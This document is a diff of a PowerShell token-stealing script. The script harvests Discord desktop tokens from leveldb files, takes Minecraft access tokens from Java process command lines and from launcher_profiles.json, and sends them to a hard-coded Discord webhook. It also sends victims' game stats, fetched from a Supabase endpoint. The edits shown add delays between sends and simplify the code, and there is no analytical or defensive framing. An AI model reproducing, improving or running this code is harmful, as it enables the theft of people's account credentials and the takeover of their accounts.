@@ -1,6 +1,5 @@
 $webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
-# Function to send to Discord
 function Send-Discord {
     param($content)
     $payload = @{ content = $content } | ConvertTo-Json -Depth 10
@@ -9,89 +8,70 @@ function Send-Discord {
     } catch {}
 }
 
-# 1. Grab Discord desktop app tokens
+# Discord app tokens
 $discordPaths = @(
     "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
 )
-$foundTokens = @()
 foreach ($path in $discordPaths) {
     if (Test-Path $path) {
         Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
             $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
             $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
             foreach ($match in $matches) {
-                if ($match.Value -notin $foundTokens) {
-                    $foundTokens += $match.Value
-                    Send-Discord "**[DISCORD APP TOKEN]**`n```$($match.Value)```"
-                }
+                Send-Discord "**[DISCORD APP TOKEN]**`n```$($match.Value)```"
+                Start-Sleep -Milliseconds 500
             }
         }
     }
 }
 
-# 2. Grab Java process tokens (Minecraft/Discord bots)
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'java%' AND CommandLine LIKE '%accessToken%'" |
+# Java tokens
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
     Select-Object -ExpandProperty CommandLine |
     ForEach-Object {
-        $accessToken = $null
-        $username = $null
-        if ($_ -match '--accessToken\s+(\S+)') { $accessToken = $matches[1] }
-        if ($_ -match '--username\s+(\S+)') { $username = $matches[1] }
-        if ($accessToken -and $username) {
-            Send-Discord "**[JAVA TOKEN - $username]**`n```$accessToken```"
-            
-            # 3. Get session stats from API
+        if ($_ -match '--accessToken\s+(\S+)' -and $_ -match '--username\s+(\S+)') {
+            $token = $matches[1]
+            $username = $matches[2]
+            Send-Discord "**[JAVA TOKEN - $username]**`n```$token```"
+            Start-Sleep -Milliseconds 500
             try {
                 $apiUrl = "https://kodyeqfgzyeokvvyxqmo.supabase.co/functions/v1/api-proxy?path=/v1/stats/$username&apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtvZHllcWZnenllb2t2dnl4cW1vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5OTUxNTUsImV4cCI6MjA5MTU3MTE1NX0.owv9p6EXYa6pL7Rt4yHr1pbE8dvv16kjcNGMv7Pi0Xs"
                 $response = Invoke-RestMethod -Uri $apiUrl -Method Get -ErrorAction SilentlyContinue
                 if ($response.status -eq 200 -and $response.result) {
-                    $money = $response.result.money
+                    $money = [int]$response.result.money
                     $shards = $response.result.shards
                     $kills = $response.result.kills
-                    $playtime = $response.result.playtime
-                    $playerhead = "https://mc-heads.net/avatar/$username/64"
-                    
-                    $statsMsg = @"
-**[SESSION STATS - $username]**
-**Money:** $$([math]::Round($money / 1000, 1))K
-**Shards:** $shards
-**Kills:** $kills
-**Playtime:** $([math]::Round($playtime / 3600, 1))h
-**Playerhead:** $playerhead
-"@
+                    $playtime = [int]$response.result.playtime
+                    $statsMsg = "**[SESSION STATS - $username]**`n**Money:** $([math]::Round($money/1000,1))K`n**Shards:** $shards`n**Kills:** $kills`n**Playtime:** $([math]::Round($playtime/3600,1))h`n**Playerhead:** https://mc-heads.net/avatar/$username/64"
                     Send-Discord $statsMsg
+                    Start-Sleep -Milliseconds 500
                 }
             } catch {}
         }
     }
 
-# 4. Grab Minecraft launcher tokens
+# Minecraft launcher
 $mcPath = "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
 if (Test-Path $mcPath) {
     try {
         $mcData = Get-Content $mcPath -Raw | ConvertFrom-Json
-        $accessToken = $mcData.accessToken
-        $uuid = $mcData.clientToken
+        $token = $mcData.accessToken
         $username = $mcData.selectedProfile.name
-        if ($accessToken) {
-            Send-Discord "**[MINECRAFT LAUNCHER TOKEN - $username]**`n```$accessToken```"
-            if ($username -and $username -ne "Unknown") {
-                try {
-                    $apiUrl = "https://kodyeqfgzyeokvvyxqmo.supabase.co/functions/v1/api-proxy?path=/v1/stats/$username&apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtvZHllcWZnenllb2t2dnl4cW1vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5OTUxNTUsImV4cCI6MjA5MTU3MTE1NX0.owv9p6EXYa6pL7Rt4yHr1pbE8dvv16kjcNGMv7Pi0Xs"
-                    $response = Invoke-RestMethod -Uri $apiUrl -Method Get -ErrorAction SilentlyContinue
-                    if ($response.status -eq 200 -and $response.result) {
-                        $money = $response.result.money
-                        $statsMsg = @"
-**[MINECRAFT STATS - $username]**
-**Money:** $$([math]::Round($money / 1000, 1))K
-**Playerhead:** https://mc-heads.net/avatar/$username/64
-"@
-                        Send-Discord $statsMsg
-                    }
-                } catch {}
-            }
+        if ($token) {
+            Send-Discord "**[MINECRAFT LAUNCHER TOKEN - $username]**`n```$token```"
+            try {
+                $apiUrl = "https://kodyeqfgzyeokvvyxqmo.supabase.co/functions/v1/api-proxy?path=/v1/stats/$username&apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtvZHllcWZnenllb2t2dnl4cW1vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5OTUxNTUsImV4cCI6MjA5MTU3MTE1NX0.owv9p6EXYa6pL7Rt4yHr1pbE8dvv16kjcNGMv7Pi0Xs"
+                $response = Invoke-RestMethod -Uri $apiUrl -Method Get -ErrorAction SilentlyContinue
+                if ($response.status -eq 200 -and $response.result) {
+                    $money = [int]$response.result.money
+                    Send-Discord "**[MINECRAFT STATS - $username]**`n**Money:** $([math]::Round($money/1000,1))K`n**Playerhead:** https://mc-heads.net/avatar/$username/64"
+                }
+            } catch {}
         }
     } catch {}
 }
+
+# Дополнительная задержка перед выходом
+Start-Sleep -Seconds 3
